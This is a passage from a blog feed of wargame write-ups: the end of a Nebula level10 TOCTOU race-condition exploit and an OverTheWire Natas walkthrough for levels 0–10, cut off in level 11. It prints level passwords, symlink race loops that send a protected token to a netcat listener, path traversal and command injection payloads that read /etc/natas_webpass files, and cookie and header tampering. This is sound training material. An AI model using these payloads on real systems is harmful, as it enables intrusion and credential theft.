</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>

<ul>
<li><em>int access(const char </em>pathname, int mode);*</li>
</ul>


<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>

<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
reason, the use of this system call should be avoided.</p></blockquote>

<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>

<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
</span><span class='line'>Connecting to 192.168.80.130:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!</span></code></pre></td></tr></table></div></figure>


<p>And on my netcat side:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
</span><span class='line'>.oO Oo.
</span><span class='line'>blabla</span></code></pre></td></tr></table></div></figure>


<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>

<ul>
<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# while true; do nc -nlp 18211; done</span></code></pre></td></tr></table></div></figure>


<ul>
<li>on the Nebula machine, I ran this command:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do touch /tmp/tok & ./flag10 /tmp/tok 192.168.80.130 & ln -fs /home/flag10/token /tmp/tok & rm -f /tmp/tok; done</span></code></pre></td></tr></table></div></figure>


<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>

<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>

<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done</span></code></pre></td></tr></table></div></figure>


<p>And in the other:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done</span></code></pre></td></tr></table></div></figure>


<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>

<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag10@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Better hope the life-inspector doesn't  \
</span><span class='line'>| come around while you have your life in |
</span><span class='line'>\ such a mess.                            /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Natas]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/"/>
    <updated>2015-11-30T04:50:00-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/30/overthewire-natas</id>
    <content type="html"><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>Username: natas0</p>

<p>Password: natas0</p>

<p>URL:      <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p>

<!-- more -->


<h3>Level 0</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas0.png" title="natas0" alt="natas 0"></p>

<p>Look in the source for the following comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 1</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas1.png" title="natas1" alt="natas 1"></p>

<p>You can still view the page source from the URL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:http://natas1.natas.labs.overthewire.org/</span></code></pre></td></tr></table></div></figure>


<p>Again, the password is in a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 2</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas2.png" title="natas2" alt="natas 2"></p>

<p>In the source you will see a directory path that you can navigate to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;files/pixel.png&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Go to <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> and you will see a directory listing. Chech the users.txt file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># username:password
</span><span class='line'>alice:BYNdCesZqW
</span><span class='line'>bob:jw2ueICLvT
</span><span class='line'>charlie:G5vCxkVV3m
</span><span class='line'>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
</span><span class='line'>eve:zo4mJWyNj2
</span><span class='line'>mallory:9urtcpzBmH</span></code></pre></td></tr></table></div></figure>


<h3>Level 3</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas2.png" title="natas3" alt="natas 3"></p>

<p>There is a comment in the source again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, since they mentioned Google, let&rsquo;s look for a robots.txt file..If you go to <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>

<h3>Level 4</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas4.png" title="natas4" alt="natas 4"></p>

<p>If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>

<h3>Level 5</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas5.png" title="natas5" alt="natas 5"></p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<h3>Level 6</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas6.png" title="natas6" alt="natas 6"></p>

<p>This time we are also given the backend source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">include</span> <span class="s2">&quot;includes/secret.inc&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&quot;FOEIUWGHFEEUHOFUOIU&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<h3>Level 7</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas7.png" title="natas7" alt="natas 7"></p>

<p>Inside the source there&rsquo;s a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas6.png" title="natas8" alt="natas 8"></p>

<p>We have to look at PHP source code again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$encodedSecret</span> <span class="o">=</span> <span class="s2">&quot;3d3d516343746d4d6d6c315669563362&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">encodeSecret</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">encodeSecret</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$encodedSecret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># hex to binary 
</span><span class='line'>3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010 
</span><span class='line'>
</span><span class='line'># binary to ascii
</span><span class='line'>00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b
</span><span class='line'>
</span><span class='line'># reverse
</span><span class='line'>==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==
</span><span class='line'>
</span><span class='line'># final base64 decode
</span><span class='line'>b3ViV1lmMmtCcQ== becomes oubWYf2kBq</span></code></pre></td></tr></table></div></figure>


<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<h3>Level 9</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas9.png" title="natas9" alt="natas 9"></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<h3>Level 10</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas10.png" title="natas10" alt="natas 10"></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</span><span class='line'>dictionary.txt:
</span><span class='line'>dictionary.txt:African
</span><span class='line'>dictionary.txt:Africans
</span><span class='line'>dictionary.txt:Allah
</span><span class='line'>dictionary.txt:Allah's
</span><span class='line'>dictionary.txt:American
</span><span class='line'>dictionary.txt:Americanism
</span><span class='line'>dictionary.txt:Americanism's
</span><span class='line'>dictionary.txt:Americanisms
</span><span class='line'>dictionary.txt:Americans
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Level 11</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas11.png" title="natas11" alt="natas 11"></p>

<p>The backend code is more complicated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
